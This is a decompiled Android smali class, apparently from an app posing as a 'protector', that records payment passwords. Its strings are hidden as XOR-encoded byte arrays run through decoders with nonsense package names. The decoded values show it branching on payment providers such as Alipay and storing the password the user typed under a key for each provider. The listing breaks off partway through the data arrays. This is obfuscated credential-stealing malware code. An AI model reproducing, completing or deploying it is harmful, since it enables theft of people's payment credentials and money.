.class public Lcom/icontrol/protector/RecordPayPassWord;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "SourceFile"


# static fields
.field private static A:Z = false


# instance fields
.field private y:Landroid/widget/EditText;

.field private z:[Landroid/widget/TextView;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    return-void
.end method

.method static synthetic Q(Lcom/icontrol/protector/RecordPayPassWord;I)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lcom/icontrol/protector/RecordPayPassWord;->T(I)V

    return-void
.end method

.method static synthetic R(Lcom/icontrol/protector/RecordPayPassWord;)Landroid/widget/EditText;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/RecordPayPassWord;->y:Landroid/widget/EditText;

    return-object p0
.end method

.method private S(Ljava/lang/String;)V
    .locals 11

    .line 1
    const/4 v0, 0x6

    new-array v1, v0, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const-string v3, ""

    invoke-static {p0, v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const/4 v3, 0x1

    new-array v4, v3, [B

    const/16 v5, -0x22

    const/4 v6, 0x0

    aput-byte v5, v4, v6

    new-array v5, v2, [B

    fill-array-data v5, :array_2

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    const/16 v5, 0xb

    const/16 v7, 0x9

    if-eqz v4, :cond_0

    new-array v0, v7, [B

    fill-array-data v0, :array_3

    new-array v1, v2, [B

    fill-array-data v1, :array_4

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-array p1, v5, [B

    fill-array-data p1, :array_5

    new-array v0, v2, [B

    fill-array-data v0, :array_6

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    :goto_0
    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p0, p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    goto/16 :goto_1

    :cond_0
    new-array v3, v3, [B

    const/16 v4, 0x24

    aput-byte v4, v3, v6

    new-array v4, v2, [B

    fill-array-data v4, :array_7

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    new-array v0, v7, [B

    fill-array-data v0, :array_8

    new-array v1, v2, [B

    fill-array-data v1, :array_9

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-array p1, v5, [B

    fill-array-data p1, :array_a

    new-array v0, v2, [B

    fill-array-data v0, :array_b

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto :goto_0

    :cond_1
    const/4 v3, 0x3

    new-array v4, v3, [B

    fill-array-data v4, :array_c

    new-array v5, v2, [B

    fill-array-data v5, :array_d

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_2

    new-array v0, v0, [B

    fill-array-data v0, :array_e

    new-array v1, v2, [B

    fill-array-data v1, :array_f

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-array p1, v2, [B

    fill-array-data p1, :array_10

    new-array v0, v2, [B

    fill-array-data v0, :array_11

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto :goto_0

    :cond_2
    const/4 v4, 0x4

    new-array v5, v4, [B

    fill-array-data v5, :array_12

    new-array v6, v2, [B

    fill-array-data v6, :array_13

    invoke-static {v5, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    const/4 v6, 0x7

    if-eqz v5, :cond_3

    new-array v0, v6, [B

    fill-array-data v0, :array_14

    new-array v1, v2, [B

    fill-array-data v1, :array_15

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-array p1, v7, [B

    fill-array-data p1, :array_16

    new-array v0, v2, [B

    fill-array-data v0, :array_17

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto/16 :goto_0

    :cond_3
    new-array v5, v3, [B

    fill-array-data v5, :array_18

    new-array v8, v2, [B

    fill-array-data v8, :array_19

    invoke-static {v5, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_4

    new-array v0, v0, [B

    fill-array-data v0, :array_1a

    new-array v1, v2, [B

    fill-array-data v1, :array_1b

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-array p1, v2, [B

    fill-array-data p1, :array_1c

    new-array v0, v2, [B

    fill-array-data v0, :array_1d

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto/16 :goto_0

    :cond_4
    new-array v5, v4, [B

    fill-array-data v5, :array_1e

    new-array v8, v2, [B

    fill-array-data v8, :array_1f

    invoke-static {v5, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_5

    new-array v0, v6, [B

    fill-array-data v0, :array_20

    new-array v1, v2, [B

    fill-array-data v1, :array_21

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-array p1, v7, [B

    fill-array-data p1, :array_22

    new-array v0, v2, [B

    fill-array-data v0, :array_23

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto/16 :goto_0

    :cond_5
    const/4 v5, 0x5

    new-array v8, v5, [B

    fill-array-data v8, :array_24

    new-array v9, v2, [B

    fill-array-data v9, :array_25

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v8, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    const/16 v9, 0xa

    if-eqz v8, :cond_6

    new-array v0, v2, [B

    fill-array-data v0, :array_26

    new-array v1, v2, [B

    fill-array-data v1, :array_27

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-array p1, v9, [B

    fill-array-data p1, :array_28

    new-array v0, v2, [B

    fill-array-data v0, :array_29

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto/16 :goto_0

    :cond_6
    new-array v8, v4, [B

    fill-array-data v8, :array_2a

    new-array v10, v2, [B

    fill-array-data v10, :array_2b

    invoke-static {v8, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v8, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_7

    new-array v0, v6, [B

    fill-array-data v0, :array_2c

    new-array v1, v2, [B

    fill-array-data v1, :array_2d

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-array p1, v7, [B

    fill-array-data p1, :array_2e

    new-array v0, v2, [B

    fill-array-data v0, :array_2f

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto/16 :goto_0

    :cond_7
    new-array v8, v4, [B

    fill-array-data v8, :array_30

    new-array v10, v2, [B

    fill-array-data v10, :array_31

    invoke-static {v8, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v8, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_8

    new-array v0, v6, [B

    fill-array-data v0, :array_32

    new-array v1, v2, [B

    fill-array-data v1, :array_33

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-array p1, v7, [B

    fill-array-data p1, :array_34

    new-array v0, v2, [B

    fill-array-data v0, :array_35

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto/16 :goto_0

    :cond_8
    new-array v4, v4, [B

    fill-array-data v4, :array_36

    new-array v8, v2, [B

    fill-array-data v8, :array_37

    invoke-static {v4, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_9

    new-array v0, v6, [B

    fill-array-data v0, :array_38

    new-array v1, v2, [B

    fill-array-data v1, :array_39

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-array p1, v7, [B

    fill-array-data p1, :array_3a

    new-array v0, v2, [B

    fill-array-data v0, :array_3b

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto/16 :goto_0

    :cond_9
    new-array v4, v6, [B

    fill-array-data v4, :array_3c

    new-array v7, v2, [B

    fill-array-data v7, :array_3d

    invoke-static {v4, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_a

    new-array v0, v9, [B

    fill-array-data v0, :array_3e

    new-array v1, v2, [B

    fill-array-data v1, :array_3f

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const/16 p1, 0xc

    new-array p1, p1, [B

    fill-array-data p1, :array_40

    new-array v0, v2, [B

    fill-array-data v0, :array_41

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto/16 :goto_0

    :cond_a
    new-array v3, v3, [B

    fill-array-data v3, :array_42

    new-array v4, v2, [B

    fill-array-data v4, :array_43

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_b

    new-array v0, v0, [B

    fill-array-data v0, :array_44

    new-array v1, v2, [B

    fill-array-data v1, :array_45

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-array p1, v2, [B

    fill-array-data p1, :array_46

    new-array v0, v2, [B

    fill-array-data v0, :array_47

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto/16 :goto_0

    :cond_b
    const/4 v0, 0x2

    new-array v3, v0, [B

    fill-array-data v3, :array_48

    new-array v4, v2, [B

    fill-array-data v4, :array_49

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_c

    new-array v0, v5, [B

    fill-array-data v0, :array_4a

    new-array v1, v2, [B

    fill-array-data v1, :array_4b

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-array p1, v6, [B

    fill-array-data p1, :array_4c

    new-array v0, v2, [B

    fill-array-data v0, :array_4d

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto/16 :goto_0

    :cond_c
    new-array v0, v0, [B

    fill-array-data v0, :array_4e

    new-array v3, v2, [B

    fill-array-data v3, :array_4f

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_d

    new-array v0, v5, [B

    fill-array-data v0, :array_50

    new-array v1, v2, [B

    fill-array-data v1, :array_51

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-array p1, v6, [B

    fill-array-data p1, :array_52

    new-array v0, v2, [B

    fill-array-data v0, :array_53

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto/16 :goto_0

    :cond_d
    :goto_1
    return-void

    :array_0
    .array-data 1
        -0x7ct
        -0x68t
        0x35t
        -0x45t
        0x1dt
        -0x11t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0xct
        -0x7t
        0x4ct
        -0x2bt
        0x78t
        -0x68t
        -0x10t
        0x5ct
    .end array-data

    :array_2
    .array-data 1
        -0x41t
        0x7et
        -0xet
        0x56t
        -0xct
        -0x79t
        -0x2ct
        0x37t
    .end array-data

    :array_3
    .array-data 1
        0x44t
        0x54t
        0x34t
        0x4bt
        -0x77t
        -0xbt
        0x72t
        -0x19t
        0x52t
    .end array-data

    nop

    :array_4
    .array-data 1
        0x25t
        0x38t
        0x5dt
        0x3bt
        -0x18t
        -0x74t
        0x1ct
        -0x7et
    .end array-data

    :array_5
    .array-data 1
        0x5bt
        -0x53t
        0x7dt
        -0x5at
        -0x4ft
        -0x69t
        -0x7et
        -0x4bt
        0x4dt
        -0x52t
        0x7at
    .end array-data

    :array_6
    .array-data 1
        0x3at
        -0x3ft
        0x14t
        -0x2at
        -0x30t
        -0x12t
        -0x14t
        -0x30t
    .end array-data

    :array_7
    .array-data 1
        0x53t
        -0x21t
        -0x39t
        0xdt
        0x13t
        0x2ft
        0x78t
        0x74t
    .end array-data

    :array_8
    .array-data 1
        0xft
        0x75t
        -0x30t
        -0x4ct
        -0x4at
        0x3ft
        0x45t
        -0x3dt
        0xft
    .end array-data

    nop

    :array_9
    .array-data 1
        0x78t
        0x10t
        -0x4dt
        -0x3ct
        -0x29t
        0x46t
        0x2bt
        -0x5at
    .end array-data

    :array_a
    .array-data 1
        0x7at
        -0x58t
        -0x15t
        0xat
        0x20t
        -0x6dt
        -0x7t
        -0x47t
        0x7at
        -0x5et
        -0x1at
    .end array-data

    :array_b
    .array-data 1
        0xdt
        -0x33t
        -0x78t
        0x7at
        0x41t
        -0x16t
        -0x69t
        -0x24t
    .end array-data

    :array_c
    .array-data 1
        0x6dt
        0x1ft
        -0x79t
    .end array-data

    :array_d
    .array-data 1
        0x14t
        0x6at
        -0x17t
        -0x3bt
        0x64t
        0xbt
        -0xct
        0x3at
    .end array-data

    :array_e
    .array-data 1
        -0x66t
        -0x80t
        0x21t
        0x6ct
        0x64t
        0x64t
    .end array-data

    nop

    :array_f
    .array-data 1
        -0x1dt
        -0xbt
        0x4ft
        0x2t
        0x1t
        0x13t
        -0x47t
        0x6t
    .end array-data

    :array_10
    .array-data 1
        -0x18t
        -0x65t
        0x3ct
        0x1at
        -0x7dt
        -0x79t
        0x66t
        0x49t
    .end array-data

    :array_11
    .array-data 1
        -0x6ft
        -0x12t
        0x52t
        0x74t
        -0x1at
        -0x10t
        0x9t
        0x27t
    .end array-data

    :array_12
    .array-data 1
        -0x80t
        0x7ft
        0x4dt
        0x3et
    .end array-data

    :array_13
    .array-data 1
        -0x16t
        0x16t
        0x2ct
        0x50t
        -0x20t
        0x47t
        0x69t
        -0x40t
    .end array-data

    :array_14
    .array-data 1
        -0x21t
        -0xbt
        -0x23t
        0x6et
        0x6ft
        -0x76t
        -0x3ct
    .end array-data

    :array_15
    .array-data 1
        -0x4bt
        -0x64t
        -0x44t
        0x0t
        0x1t
        -0x11t
        -0x4dt
        0x3ct
    .end array-data

    :array_16
    .array-data 1
        0x5et
        -0x44t
        -0x29t
        0x68t
        -0x50t
        0x17t
        0x24t
        0x2t
        0x5at
    .end array-data

    nop

    :array_17
    .array-data 1
        0x34t
        -0x2bt
        -0x4at
        0x6t
        -0x22t
        0x72t
        0x53t
        0x6dt
    .end array-data

    :array_18
    .array-data 1
        -0xet
        0x4bt
        0x3dt
    .end array-data

    :array_19
    .array-data 1
        -0x75t
        0x24t
        0x48t
        -0x48t
        -0x33t
        -0xdt
        -0x76t
        0x4dt
    .end array-data

    :array_1a
    .array-data 1
        0x21t
        -0x55t
        0x1t
        0x3ct
        0x4ct
        0x31t
    .end array-data

    nop

    :array_1b
    .array-data 1
        0x58t
        -0x3ct
        0x74t
        0x52t
        0x29t
        0x46t
        -0x18t
        0x67t
    .end array-data

    :array_1c
    .array-data 1
        -0x72t
        0x76t
        0x11t
        -0xbt
        -0x63t
        0x9t
        -0x5at
        -0x18t
    .end array-data

    :array_1d
    .array-data 1
        -0x9t
        0x19t
        0x64t
        -0x65t
        -0x8t
        0x7et
        -0x37t
        -0x7at
    .end array-data

    :array_1e
    .array-data 1
        0x27t
        0x1at
        -0x2at
        -0x4at
    .end array-data

    :array_1f
    .array-data 1
        0x49t
        0x75t
        -0x48t
        -0x2ft
        0x6t
        -0x32t
        0x2t
        0x34t
    .end array-data

    :array_20
    .array-data 1
        -0x6ct
